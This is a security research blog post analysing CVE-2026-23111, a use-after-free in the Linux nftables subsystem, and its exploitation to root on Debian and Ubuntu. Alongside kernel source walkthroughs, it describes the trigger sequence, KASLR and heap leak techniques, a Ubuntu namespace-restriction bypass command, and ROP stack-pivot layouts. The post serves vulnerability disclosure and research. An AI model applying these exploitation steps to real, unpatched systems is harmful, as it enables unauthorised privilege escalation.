@@ -1,0 +1,733 @@
+By Oliver Sieber
+
+## Overview
+
+In this blog post, we discuss a use-after-free vulnerability that we found in the nftables subsystem of the Linux kernel in early 2025. This vulnerability was [patched upstream](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f41c5d151078c5348271ffaf8e7410d96f2d82f8) on 5 February 2026 and assigned [CVE-2026-23111](https://nvd.nist.gov/vuln/detail/CVE-2026-23111).
+
+This blog post covers a technical analysis of the vulnerability and how we exploited it to perform a local privilege escalation from an unprivileged user to root on Debian Bookworm, Debian Trixie, Ubuntu 22.04 LTS, and Ubuntu 24.04 LTS.
+
+## Preliminaries
+
+This section is dedicated to the introduction of the main structures of nftables and the concept of generation masks. If you are familiar with this subsystem, feel free to skip this section.
+
+Another recommended introduction to nftables is given by the blog post [How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables](https://web.archive.org/web/20240714125127/https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/).
+
+The main structures are `nft_table`, `nft_chain`, `nft_rule`, `nft_expr`, `nft_set`, and `nft_set_elem`. A simplification of their dependencies is illustrated in the image below.
+
+[![](https://blog.exodusintel.com/wp-content/uploads/2026/06/1st-image-1024x546.png)](https://blog.exodusintel.com/wp-content/uploads/2026/06/1st-image-scaled.png)
+
+### Netfilter
+
+Netfilter is the Linux kernel packet filtering framework, and it is commonly associated with iptables and its successor nftables. It enables packet filtering, network address and port translation, packet logging, userspace packet queuing, and other packet mangling.
+
+The netfilter hooks are a framework inside the Linux kernel that allows kernel modules to register callback functions at different locations of the Linux network stack. The registered callback function is then called for every packet that traverses the respective hook within the Linux network stack.
+
+The iptables and now nftables frameworks allow defining rule sets and work by interacting with the packet filtering hooks defined by the netfilter framework.
+
+### nftables
+
+In nftables, the top-level containers within a given rule set are the tables (`struct nft_table`). They can hold chains, sets, maps, flowtables, and stateful objects. Each table belongs to exactly one family, where each family corresponds to a different networking level (e.g., `ip` for IPv4, `ip6` for IPv6, `arp` for ARP, etc.).
+
+### Chains
+
+Chains (`struct nft_chain`) are the next topmost level containers. They are associated with tables and can have rules associated to them. Chains allow processing packets at a particular processing step. To do so, a base chain of the desired type (i.e., filter, route, or NAT) has to be created and then attached to the appropriate netfilter hook (e.g. ingress, pre-routing, input, forward, output, and post-routing).
+
+### Rules
+
+Rules (`struct nft_rule`) are the elements that specify which action to take on network packets based on whether they match the specified criteria. Each rule consists of zero or more expressions followed by one or more statements. Each expression tests whether a packet matches a specific payload field or packet/flow metadata. Multiple expressions are linearly evaluated from left to right; if the first expression matches, then the next expression is evaluated, and so on. If all the expressions in a rule are matched by a given packet, the rule’s statements are executed. A statement defines which action to take, such as counting, logging, accepting or dropping the packet.
+
+The rules of a chain are connected to each other via a doubly linked list.
+
+### Verdicts
+
+Verdicts (`struct nft_verdict`) in nftables are the outcomes of evaluating packet rules within a chain. When a packet matches a rule, a verdict determines the subsequent action: continued evaluation within the current chain, redirection to another chain, or termination of processing with acceptance or rejection of the packet.
+
+A few of the common verdicts are:
+
+- `NFT_CONTINUE`: continue evaluation of the current rule.
+- `NFT_BREAK`: terminate evaluation of the current rule.
+- `NFT_JUMP`: push the current chain on the jump stack and jump to a chain.
+- `NFT_GOTO`: jump to a chain without pushing the current chain on the jump stack.
+- `NFT_RETURN`: return to the topmost chain on the jump stack.
+- `NF_DROP`: drop the packet. No further evaluation takes place.
+- `NF_ACCEPT`: accept the packet.
+
+### Expressions
+
+Expressions (`struct nft_expr`) are sequences of operations that are evaluated one after another to form a rule. They are used to represent either data gathered from the packet during rule set evaluation or constant values like network addresses and port numbers. Expressions can be merged using binary, logical, relational, and other types of expressions to form complex or compound expressions. They are also used as arguments for certain types of  
+operations like NAT and packet marking.
+
+Examples of such expressions are:
+
+- `nft_immediate`: loads an immediate value into a register.
+- `nft_cmp`: compares given data with data from a given register.
+- `nft_meta`: set/get packet meta information, such as related interfaces,  
+  timestamps, etc.
+- `nft_payload`: set/get arbitrary data from packet headers.
+
+The following is an example rule that duplicates traffic directed at the IP address `192.168.0.10` to the `ens192` interface:
+
+```
+table netdev filter {
+  chain input {
+    type filter hook ingress device ens192 priority 0;
+    ip daddr 192.168.0.10 dup to ens192;
+  }
+}
+```
+
+### Sets
+
+The built-in infrastructure of nftables allows using sets (`struct nft_set`) with any supported selectors. The generic set infrastructure is also used in the implementation of maps and verdict maps. The elements of a set are internallyrepresented using data structures such as hash tables and red-black trees.
+
+Two types of sets exist:
+
+- *Anonymous* sets have no name and cannot be updated once they are created and bound to a rule. These sets are removed once the corresponding rule is removed.
+- *Named* sets do not have to be bound to a rule. They can exist on their own, are associated to a table, and can be updated anytime.
+
+There are various types of sets in nftables. When a set is created, an implementation is chosen based on the set properties and flags. Set types can be found at `/net/netfilter/nft_set_*.c`. Some types include:
+
+- `hash`
+- `rbtree`
+- `pipapo`
+
+The type name `pipapo` stands for Pile Packet Policies. Other set types allow matching entries with interval expressions (`rbtree`), e.g. 192.0.2.1-192.0.2.4, and specifying field concatenation (`hash`, `rhash`), e.g. 192.0.2.1:22, but not both. Sets of type `pipapo` can match range expressions for multiple fields at a time.
+
+Sets can also function as verdict maps, where each element maps a key to a verdict such as accept, drop, or goto. Any set type can additionally include a *catchall element*, which acts as a wildcard default – if a lookup doesn’t match any other element in the set, the catchall element is used. Catchall elements are not stored in the set’s backend data structure but instead maintained in a separate generic list (`set->catchall_list`).
+
+### Generation Masks
+
+The nftables subsystem in the Linux kernel utilizes a generational mechanism to manage the lifecycle of objects. This mechanism is governed by a concept called the generation cursor (gencursor), which defines two key generations:
+
+- The current generation (representing the active state).
+- The next generation (representing a future state).
+
+Each object has a 2-bit bitmask (the genmask) that indicates its active status across these two generations:
+
+- A set bit (1) in the bitmask signifies that the object is inactive in the  
+  corresponding generation.
+- A cleared bit (0) signifies that the object is active in the corresponding  
+  generation.
+
+This mechanism enables atomic, transactional updates to the ruleset. Changes are staged in the next generation without affecting the currently active ruleset, and then applied all at once by flipping the generation cursor. The lifecycle of an object through this system proceeds as follows:
+
+When a new object is added, it is marked as inactive in the current generation and active in the next generation. This ensures the new object is staged for activation without disrupting ongoing packet processing. When the ruleset is committed, the bitmask is cleared entirely, meaning the object becomes active in all generations. Conversely, when an object is removed, it is marked as inactive in the next generation. After committing the ruleset, the object is then fully removed.
+
+## Vulnerability
+
+Before an nftables verdict map is deleted, its elements are deactivated first. This involves unlinking the elements from the map and removing any references they have to other objects, such as chains. Each nftables chain maintains a reference counter, and can only be deleted when this counter is zero.
+
+When an nftables verdict map, which has a `catchall` element referencing a chain, is deleted, the `catchall` element is deactivated and the chain’s reference counter is decremented. If an error occurs in the same batch of transactions after the nftables verdict map set was deleted, the abort process is invoked and the deletion of the set has to be reverted. In particular, the deactivated `catchall` element has to be reactivated and the chain’s reference counter has to be incremented. To accomplish this, the `nft_map_catchall_activate()` function is executed. However, the `nft_map_catchall_activate()` function incorrectly skips deactivated `catchall` elements and activates elements, which are already active.
+
+Therefore, the `catchall` element, which was deactivated during the deletion of the nftables verdict map, remains incorrectly inactive after the abort process has completed. Moreover, the chain’s reference counter remains incorrectly zero.
+
+If another object holds a valid reference to the chain, the chain’s reference counter can be zero, although a valid reference to the chain still remains. Since the chain’s reference counter is zero, the chain can be deleted. Thus, deleting the chain results in a use-after-free vulnerability.
+
+## Code Analysis
+
+In the following, let us consider a batch containing two transactions and follow the relevant code paths: the first transaction successfully deletes a pipapo-backed verdict map, and the second fails and triggers the abort process.
+
+In this example, the `pipapo` set has one `catchall` element with verdict data referencing a chain. We assume that this is the only reference to the chain and thus, the chain’s reference counter is one.
+
+When the kernel receives the netlink batch, it processes each message individually by calling its corresponding netlink callback. For `NFT_MSG_DELSET`, it calls `nf_tables_delset()`, which invokes the `nft_delset()` function.
+
+In the following, it is first shown how the `nft_delset()` function leads to the deactivation of the `catchall` element. Afterward, it is explained how the abort process incorrectly fails to reactivate the `catchall` element.
+
+The following listing shows the `nft_delset()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L801
+
+static int nft_delset(const struct nft_ctx *ctx, struct nft_set *set)
+{
+	int err;
+
+	err = nft_trans_set_add(ctx, NFT_MSG_DELSET, set);
+	if (err < 0)
+		return err;
+
+[1]
+
+	if (set->flags & (NFT_SET_MAP | NFT_SET_OBJECT))
+		nft_map_deactivate(ctx, set);
+
+	nft_deactivate_next(ctx->net, set);
+	nft_use_dec(&ctx->table->use);
+
+	return err;
+}
+```
+
+As `pipapo` sets are created with the `NFT_SET_MAP` flag, the `nft_map_deactivate()` function is called, at \[1\], which invokes the `nft_map_catchall_deactivate()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L769
+
+static void nft_map_catchall_deactivate(const struct nft_ctx *ctx,
+					struct nft_set *set)
+{
+	u8 genmask = nft_genmask_next(ctx->net);
+	struct nft_set_elem_catchall *catchall;
+	struct nft_set_ext *ext;
+
+[2]
+
+	list_for_each_entry(catchall, &set->catchall_list, list) {
+		ext = nft_set_elem_ext(set, catchall->elem);
+		if (!nft_set_elem_active(ext, genmask))
+			continue;
+
+[3]
+
+		nft_set_elem_change_active(ctx->net, set, ext);
+		nft_setelem_data_deactivate(ctx->net, set, catchall->elem);
+		break;
+	}
+}
+```
+
+The `nft_map_catchall_deactivate()` function iterates through all catchall elements, which are given by the `catchall_list` member of the `pipapo` set. If a `catchall` element is not active with respect to the next generation mask, the next catchall element is processed \[2\]. In the current example, the `catchall` element is active with respect to the next generation mask. Hence, its activity status is changed from active to inactive by calling the `nft_set_elem_change_active()` function, at \[3\]. Afterward, the `nft_setelem_data_deactivate()` function is invoked and the loop breaks.
+
+The next listing shows the `nft_setelem_data_deactivate()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L7560
+
+void nft_setelem_data_deactivate(const struct net *net,
+				 const struct nft_set *set,
+				 struct nft_elem_priv *elem_priv)
+{
+	const struct nft_set_ext *ext = nft_set_elem_ext(set, elem_priv);
+
+	if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
+
+[4]
+
+		nft_data_release(nft_set_ext_data(ext), set->dtype);
+	if (nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF))
+		nft_use_dec(&(*nft_set_ext_obj(ext))->use);
+}
+```
+
+In the current example, the `catchall` element has verdict data referencing a chain. Thus, the `nft_data_release()` function is called, at \[4\], which invokes the `nft_verdict_uninit()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L11530
+
+static void nft_verdict_uninit(const struct nft_data *data)
+{
+	struct nft_chain *chain;
+
+	switch (data->verdict.code) {
+	case NFT_JUMP:
+	case NFT_GOTO:
+
+[5]
+
+		chain = data->verdict.chain;
+		nft_use_dec(&chain->use);
+		break;
+	}
+}
+```
+
+As the `catchall` element’s verdict data references a chain, the chain’s reference counter `chain->use` is decremented from one to zero by calling `nft_use_dec()`, at \[5\].
+
+In conclusion, deleting the `pipapo` set resulted in the deactivation of the `catchall` element and decrementing the chain’s reference counter.
+
+If an error occurs in the same batch of transactions after deleting the `pipapo` set, the abort process is invoked and the deletion of the `pipapo` set has to be reverted. In particular, the deactivated `catchall` element has to be reactivated. The reactivation is performed by calling the `nft_map_catchall_activate()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L5713
+
+static void nft_map_catchall_activate(const struct nft_ctx *ctx,
+				      struct nft_set *set)
+{
+	u8 genmask = nft_genmask_next(ctx->net);
+	struct nft_set_elem_catchall *catchall;
+	struct nft_set_ext *ext;
+
+	list_for_each_entry(catchall, &set->catchall_list, list) {
+		ext = nft_set_elem_ext(set, catchall->elem);
+
+[6]
+
+		if (!nft_set_elem_active(ext, genmask))
+			continue;
+
+[7]
+
+		nft_clear(ctx->net, ext);
+		nft_setelem_data_activate(ctx->net, set, catchall->elem);
+		break;
+	}
+}
+```
+
+The `nft_map_catchall_activate()` function iterates through the elements of the `pipapo` set’s `catchall_list`. At \[6\], the inactive `catchall` element is incorrectly not further processed (notice the `!` operator in the condition). Instead, only active `catchall` elements are activated at \[7\]. However, the inactive `catchall` elements should be activated at \[7\].
+
+The invocation of the `nft_clear()` function, at \[7\], would have activated the deactivated `catchall` element with respect to the next generation mask. Consequently, the `catchall` element in the current example remains incorrectly inactive with respect to the next generation mask.
+
+Moreover, the invocation of the `nft_setelem_data_activate()` function, at \[7\], would have led to a chain of executions resulting in the invocation of the `nft_use_inc_restore()` function. The `nft_use_inc_restore()` function would have incremented the chain’s reference counter from zero to one.
+
+In summary, when the abort process has completed, the `pipapo` set’s `catchall_list` consists of one `catchall` element, which is inactive with respect to the next generation and the chain’s reference counter is zero.
+
+In the next step, a valid batch of transactions can be sent such that the next generation mask is toggled while the `catchall` element’s generation mask remains the same. After the next generation mask is toggled, the `catchall` element becomes active with respect to the next generation. As the `catchall` element is active with respect to the next generation, it can be deleted with the next batch of transactions. This results in the kernel attempting to decrement the victim chain’s reference counter from zero to negative one.
+
+If another object holds a valid reference to the chain, this vulnerability can cause the chain’s reference counter to be zero, although a valid reference to the chain still remains. Therefore, deleting such a chain results in a use-after-free vulnerability.
+
+*Note*: Interestingly, the `break` instructions in the above code listings, at \[3\] and \[7\], introduced another bug ([CVE-2026-23278](https://nvd.nist.gov/vuln/detail/CVE-2026-23278), [patch commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7cb9a23d7ae40a702577d3d8bacb7026f04ac2a9)). However, this bug is not within the scope of this blog post.
+
+## Exploitation
+
+The exploit presented in this blog post involves the following steps:
+
+- Triggering the vulnerability;
+- Leaking the kernel base address;
+- Leaking heap addresses;
+- Changing the control flow and executing a ROP chain.
+
+These steps are elaborated in the following sections.
+
+### Triggering the Vulnerability
+
+To trigger the vulnerability, a new network namespace has to be created, as a low-privileged user cannot issue commands on the default namespace.
+
+In contrast to Debian and Ubuntu 22.04, there are restrictions in Ubuntu 24.04 which prevent a low-privileged user from creating namespaces. However, these restrictions can be bypassed, e.g. by executing the `aa-exec -p trinity -- unshare -Urmin /bin/sh` command.
+
+See [Bypassing Ubuntu’s unprivileged user namespace restrictions](https://web.archive.org/web/20250402085309/https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt) for more details.
+
+Next, multiple nftables objects are created:
+
+- A table.
+- A regular chain.
+- A base chain used to hook ingress packets (incoming packets).
+  - A rule for an immediate expression with verdict data referencing the  
+    regular chain is added to the base chain.
+  - This rule is the dangling pointer which is abused later to exploit  
+    the use-after-free vulnerability.
+- A `pipapo` set to trigger the vulnerability.
+  - A `catchall` element in the `pipapo` set with verdict data, which has the  
+    `NFT_GOTO` verdict code and references the regular chain.
+
+The following image shows this basic setup. In particular, note that the victimchain’s reference counter is two.
+
+[![](https://blog.exodusintel.com/wp-content/uploads/2026/06/2nd-image-1024x573.png)](https://blog.exodusintel.com/wp-content/uploads/2026/06/2nd-image-scaled.png)
+
+To trigger the vulnerability and set the regular chain’s reference counter to zero, although the base chain has a rule referencing the regular chain, the following commit batches are sent:
+
+Batch 1:
+
+- Delete the `pipapo` set. Afterward, trigger an error in the same batch to trigger the abort process.
+
+Batch 2:
+
+- Send a benign batch with a successful transaction to toggle the generation cursor. E.g., create a dummy chain.
+
+Batch 3:
+
+- Delete the `pipapo` set.
+
+Batch 4:
+
+- Delete the regular chain.
+
+Next, it is shown how these batches trigger the vulnerability. To improve the overview of what is happening in each batch, the following table shows how the value of current generation mask, the next generation mask, and the catchall element’s generation mask change for each batch. The table describes the state before each batch is processed.
+
+[![](https://blog.exodusintel.com/wp-content/uploads/2026/06/3rd-image-1024x635.png)](https://blog.exodusintel.com/wp-content/uploads/2026/06/3rd-image.png)
+
+### Batch 1
+
+When Batch 1 is called, the state is as follows:
+
+- next generation mask: `0b01`;
+- `catchall` generation mask: `0b00`;
+- `catchall` is active with respect to the next generation mask;
+- regular chain’s reference counter: 2.
+
+The deletion of the `pipapo` set results in the deactivation of the `catchall` element and the regular chain’s reference counter is decremented from 2 to 1.
+
+The generation mask of the `catchall` element is set to `0b01` such that it is inactive with respect to the next generation mask `0b01`.
+
+Due to the bug in the `nft_map_catchall_activate()` function, the `catchall` element is not reactivated and the regular chain’s reference counter is not incremented from 1 to 2.
+
+Thus, the generation mask of the `catchall` element remains `0b01`.
+
+### Batch 2
+
+When the valid Batch 2 is called, the state is as follows:
+
+- next generation mask: `0b01`;
+- `catchall` generation mask: `0b01`;
+- The `catchall` element is inactive with respect to the next generation mask;
+- regular chain’s reference counter: 1.
+
+### Batch 3
+
+When Batch 3 is called, the state is as follows:
+
+- next generation mask: `0b10` (it is important that it was toggled due to the valid Batch 2);
+- `catchall` generation mask: `0b01`;
+- The `catchall` element is active with respect to the next generation mask! Thus, it can be deleted.
+
+This batch deletes the `pipapo` set without triggering the abort process afterward. During the deletion of the `pipapo` set, the `nft_map_catchall_deactivate()` is called which deactivates the `catchall` element. Since the `catchall` element has verdict data referencing the regular chain, the chain’s reference counter is decremented from 1 to 0. Since no abort process is invoked, the chain’s reference counter remains 0.
+
+### Batch 4
+
+As the regular chain’s reference counter is 0, the chain can be successfully deleted. However, since the base chain still has a rule which references the regular chain, a use-after-free vulnerability occurs.
+
+## Leaking the Kernel Base Address
+
+To leak the kernel base address, the use-after-free vulnerability is triggered for a regular chain with a name of length 30. When the chain was created, an object in `kmalloc-cg-32` was allocated for the name.
+
+When the regular chain is deleted, the `kmalloc-cg-32` object containing the chain’s name is freed. Afterward, the userland exploit executes `open("/proc/self/stat", 0);` which invokes the `single_open()` kernel function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/fs/seq_file.c#L572
+
+int single_open(struct file *file, int (*show)(struct seq_file *, void *),
+    void *data)
+{
+
+[1]
+
+  struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);
+  int res = -ENOMEM;
+
+  if (op) {
+
+[2]
+
+    op->start = single_start;
+    op->next = single_next;
+    op->stop = single_stop;
+    op->show = show;
+    res = seq_open(file, op);
+    if (!res)
+      ((struct seq_file *)file->private_data)->private = data;
+    else
+      kfree(op);
+  }
+  return res;
+}
+```
+
+At \[1\], an object of the type `struct seq_operations` is allocated on the heap. The `seq_operations` structure is shown in the following listing.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/include/linux/seq_file.h#L31
+
+struct seq_operations {
+  void * (*start) (struct seq_file *m, loff_t *pos);
+  void (*stop) (struct seq_file *m, void *v);
+  void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+  int (*show) (struct seq_file *m, void *v);
+};
+```
+
+The `seq_operations` structure consists of four function pointers which are set at \[2\]. Since the structure has a size of 32 bytes, the object is allocated in `kmalloc-cg-32` and reclaims the freed object, where the regular chain’s name was stored previously.
+
+Due to the use-after-free vulnerability, the base chain still has a rule which contains an immediate expression with verdict data referencing the deleted regular chain. Sending an `NFT_MSG_GETRULE` request for this rule results in the execution of the `nft_verdict_dump()` function.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_api.c#L11543
+
+int nft_verdict_dump(struct sk_buff *skb, int type, const struct nft_verdict *v)
+{
+  struct nlattr *nest;
+
+  nest = nla_nest_start_noflag(skb, type);
+  if (!nest)
+    goto nla_put_failure;
+
+  if (nla_put_be32(skb, NFTA_VERDICT_CODE, htonl(v->code)))
+    goto nla_put_failure;
+
+  switch (v->code) {
+  case NFT_JUMP:
+  case NFT_GOTO:
+
+[3]
+
+    if (nla_put_string(skb, NFTA_VERDICT_CHAIN,
+           v->chain->name))
+      goto nla_put_failure;
+  }
+  nla_nest_end(skb, nest);
+  return 0;
+
+nla_put_failure:
+  return -1;
+}
+```
+
+At \[3\], the name of the deleted regular chain is dumped. Since a `seq_operations` structure was placed into the chunk of the chain’s name, the function pointers can be leaked, which were set at \[2\] and point into the kernel address space. This address leak can be used to compute the kernel base address and defeat KASLR.
+
+If no `seq_operations` structure was placed into the chunk of the chain’s name, this whole step is repeated.
+
+If the `start` member of the `seq_operations` structure contains a null byte, leaking the kernel base address may not work with this approach. Since the chain’s name, which is dumped at \[3\], is interpreted as a string, leaking the data of the overwritten chain’s name stops at a null byte.
+
+## Leaking Heap Addresses
+
+To leak heap addresses, the vulnerability is triggered again with a new table, a new `pipapo` set, and new chains. In particular, this time the length of the regular chain’s name is 140 bytes, such that the name is allocated in `kmalloc-cg-192`. After triggering the vulnerability, the regular chain is deleted and the base chain has a rule for an immediate expression with verdict data referencing the deleted regular chain.
+
+Now, rules with the `struct nft_rule` type are created, which are shown in the following listing.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/include/net/netfilter/nf_tables.h#L995
+
+struct nft_rule {
+        struct list_head                list;
+        u64                             handle:42,
+                                        genmask:2,
+                                        dlen:12,
+                                        udata:1;
+        unsigned char                   data[]
+                __attribute__((aligned(__alignof__(struct nft_expr))));
+};
+```
+
+By providing a `data` member with a controllable size, first a rule of size 96 is created and afterward, multiple rules of size 192 are created. These rules are linked to each other via their `list` member with the `struct list_head` type, which is shown in the next listing.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/include/linux/types.h#L194
+
+struct list_head {
+        struct list_head *next, *prev;
+};
+```
+
+A rule of size 192 reclaims the freed `kmalloc-cg-192` object, which was the regular chain’s name. This rule’s `prev` and `next` members point to the rules, which were placed into a chunk of size 96 and a chunk of size 192, respectively. Therefore, similarly to the kernel base address leak, sending an `NFT_MSG_GETRULE` request for the base chain’s rule pointing to the deleted chain results in the execution of the `nft_verdict_dump()` function. At \[3\], the `prev` and `next` pointers are leaked, which point to chunks of size 96 and 192, respectively.
+
+If the `prev` or `next` pointers contain a null byte, this step has to be repeated, because `nft_verdict_dump()` interprets the chain’s name as a string at \[3\].
+
+### Changing the Control Flow
+
+The next step is changing the control flow. The vulnerability is triggered again with a new table, a new `pipapo` set, and new chains. Incoming network packets are evaluated against the rule set of a chain by the `nft_do_chain()` function, which is shown in the following listing.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_core.c#L252
+
+unsigned int
+nft_do_chain(struct nft_pktinfo *pkt, void *priv)
+{
+
+[Truncated]
+
+do_chain:
+  if (genbit)
+    blob = rcu_dereference(chain->blob_gen_1);
+  else
+
+[4]
+
+    blob = rcu_dereference(chain->blob_gen_0);
+
+  rule = (struct nft_rule_dp *)blob->data;
+next_rule:
+  regs.verdict.code = NFT_CONTINUE;
+  for (; !rule->is_last ; rule = nft_rule_next(rule)) {
+    nft_rule_dp_for_each_expr(expr, last, rule) {
+      if (expr->ops == &nft_cmp_fast_ops)
+        nft_cmp_fast_eval(expr, &regs);
+      else if (expr->ops == &nft_cmp16_fast_ops)
+        nft_cmp16_fast_eval(expr, &regs);
+      else if (expr->ops == &nft_bitwise_fast_ops)
+        nft_bitwise_fast_eval(expr, &regs);
+      else if (expr->ops != &nft_payload_fast_ops ||
+         !nft_payload_fast_eval(expr, &regs, pkt))
+
+[5]
+
+        expr_call_ops_eval(expr, &regs, pkt);
+
+      if (regs.verdict.code != NFT_CONTINUE)
+        break;
+    }
+
+[Truncated]
+
+  }
+
+[Truncated]]
+
+  switch (regs.verdict.code) {
+  case NFT_JUMP:
+    if (WARN_ON_ONCE(stackptr >= NFT_JUMP_STACK_SIZE))
+      return NF_DROP;
+    jumpstack[stackptr].rule = nft_rule_next(rule);
+    stackptr++;
+    fallthrough;
+  case NFT_GOTO:
+
+[6]
+
+    chain = regs.verdict.chain;
+    goto do_chain;
+
+[Truncated]
+
+}
+```
+
+The base chain has a rule with an immediate expression and verdict data with the `NFT_GOTO` code pointing to the deleted regular chain. Therefore, at \[6\], the deleted regular chain is set to `chain` and the function jumps to the `do_chain` label. Then, the deleted regular chain’s `chain->blob_gen_0` member with the `struct nft_rule_blob *` type is dereferenced, at \[4\]. Afterward, at \[5\], the `expr_call_ops_eval()` function evaluates the packet against the expression referenced by the regular chain’s `chain->blob_gen_0` member. The `expr_call_ops_eval()` function is shown in the following listing.
+
+```
+// Source: https://elixir.bootlin.com/linux/v6.13-rc7/source/net/netfilter/nf_tables_core.c#L206
+
+static void expr_call_ops_eval(const struct nft_expr *expr,
+             struct nft_regs *regs,
+             struct nft_pktinfo *pkt)
+{
+#ifdef CONFIG_MITIGATION_RETPOLINE
+  unsigned long e;
+
+  if (nf_skip_indirect_calls())
+    goto indirect_call;
+
+  e = (unsigned long)expr->ops->eval;
+#define X(e, fun) \
+  do { if ((e) == (unsigned long)(fun)) \
+    return fun(expr, regs, pkt); } while (0)
+
+  X(e, nft_payload_eval);
+  X(e, nft_cmp_eval);
+  X(e, nft_counter_eval);
+  X(e, nft_meta_get_eval);
+  X(e, nft_lookup_eval);
+#if IS_ENABLED(CONFIG_NFT_CT)
+  X(e, nft_ct_get_fast_eval);
+#endif
+  X(e, nft_range_eval);
+  X(e, nft_immediate_eval);
+  X(e, nft_byteorder_eval);
+  X(e, nft_dynset_eval);
+  X(e, nft_rt_get_eval);
+  X(e, nft_bitwise_eval);
+  X(e, nft_objref_eval);
+  X(e, nft_objref_map_eval);
+#undef  X
+indirect_call:
+#endif /* CONFIG_MITIGATION_RETPOLINE */
+
+[7]
+
+  expr->ops->eval(expr, regs, pkt);
+}
+```
+
+At \[7\], the `ops->eval` function pointer member of the expression is called. This call is used to hijack the control flow.
+
+There are differences in hijacking the control flow on Debian Bookworm/Trixie and Ubuntu 22.04/24.04, which are discussed in the following.
+
+### Debian
+
+In the case of the Debian 6.12.8-1 kernel, the assembler code looks as follows when `expr->ops->eval` is invoked at \[7\].
+
+```
+mov    rax,QWORD PTR [rax]
+mov    rdx,rbp
+mov    rsi,r12
+mov    rdi,rbx
+call   0xffffffffad2f7bc0
+```
+
+Hence, the `rbx` register contains a pointer to the expression, which is stored in the `blob_gen_0` object. To be more specific, if `unsigned long blob_gen_0_data[]` denotes the data of the `blob_gen_0` chunk, then `rbx = &blob_gen_0_data[2]`. Thus, `blob_gen_0_data[2]` contains the pointer to the fake `expr->ops` object.
+
+Next, it is explained in detail how the control flow is hijacked to escalate privileges to root.
+
+First, addresses of heap chunks of size 96 and 192 are leaked. The leaked address of the chunk of size 192 is referred to as `heap_addr_192_first` in the following. In particular, the following data is placed into the rule of size 192 at the `heap_addr_192_first` address.
+
+```
+int off = 0;
+// the first two entries are used to mimic a fake nft_expr_ops structure.
+// rule_data_fake_expr_ops[0] is the ops->eval function pointer
+
+[8]
+
+rule_data_fake_expr_ops[off++] = push_rbx_pop_rsp_pop_rbp;      // push rbx ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
+rule_data_fake_expr_ops[off++] = 0x1111111111111111;            // dummy data, popped into rbp by rule_data_fake_blob[x]=mov_rsp_rbp_pop_rbp
+
+// final part of the ROP chain
+
+[9]
+
+// rule_data_fake_expr_ops[off++] = ...;
+```
+
+Next, a second pair of addresses of heap chunks of size 96 and 192 is leaked. The leaked address of the chunk of size 192 is referred to as `heap_addr_192_second` in the following. The data, which was placed into the rule of size 192 with the `heap_addr_192_second` address, is shown in the next listing.
+
+```
+int off = 0;
+
+// the first three entries are used to mimic a fake object for chain->blob_gen_0
+
+[10]
+
+rule_data_fake_blob[off++] = 0x100;
+rule_data_fake_blob[off++] = 0xffffffffffffff00;        // set blob_gen_0->data->is_last = 0
+rule_data_fake_blob[off++] = heap_addr_192_first + 4*8; // pointer to expr->ops => rule_data_fake_blob_ops[0] is expr-ops->eval
+
+// start of the ROP chain
+
+[11]
+
+// rule_data_fake_blob[off++] = ...;
+
+// pivoting the stack to the final part of the ROP chain at heap_addr_192_first + 6*8
+
+[12]
+
+rule_data_fake_blob[off++] = pop_rbp;                       // pop rbp ; ret
+rule_data_fake_blob[off++] = heap_addr_192_first + 5*8; 
+rule_data_fake_blob[off++] = mov_rsp_rbp_pop_rbp;           // mov rsp, rbp ; pop rbp ; ret
+```
+
+As explained at the beginning of this subsection, the vulnerability is triggered once more to hijack the control flow. When the vulnerability is triggered, the object in `kmalloc-cg-128` containing the regular chain is freed. The `blob_gen_0` member of the deleted regular chain is referenced at \[4\], it contains a pointer to the `struct nft_expr_ops` object whose `eval` function pointer is called at \[7\]. To manipulate the `blob_gen_0` member of the deleted regular chain tables are allocated whose user data buffers reclaim the deleted regular chain and overwrite its `blob_gen_0` member. The table’s user data of size 128 is shown in the following listing.
+
+```
+[13]
+
+int off = 0;
+data_128[off++] = heap_addr_192_second + 4*8;   // the blob_gen_0 member of the regular chain
+data_128[off++] = heap_addr_192_second + 4*8;   // the blob_gen_1 member of the regular chain
+```
+
+When `expr->ops->eval()` is called at \[7\], the following series of executions is triggered. Since the regular chain’s `blob_gen_0` member was overwritten with `heap_addr_192_second + 4*8` \[13\], the `expr->ops` function pointer at \[7\] is `heap_addr_192_first + 4*8`. The memory at `heap_addr_192_first + 4*8` is shown at \[10\]. The fake `expr->ops-eval` function pointer is the `push_rbx_pop_rsp_pop_rbp` gadget at \[8\], which is executed when `expr->ops->eval()` is called at \[7\]. The `rbx` register has the `&rule_data_fake_blob[2]` value \[10\].
+
+This pivots the stack to `&rule_data_fake_blob[2]`. The subsequent `pop rbp` and `ret` instructions advance the stack, causing the first ROP gadget at `rule_data_fake_blob[4]` to be executed at \[11\]. Since the available memory in `rule_data_fake_blob` is not sufficient for the complete ROP chain, the stack has to be pivoted once more at \[12\] such that the final part of the ROP chain continues inside the data of `heap_addr_192_second`, at \[9\].
+
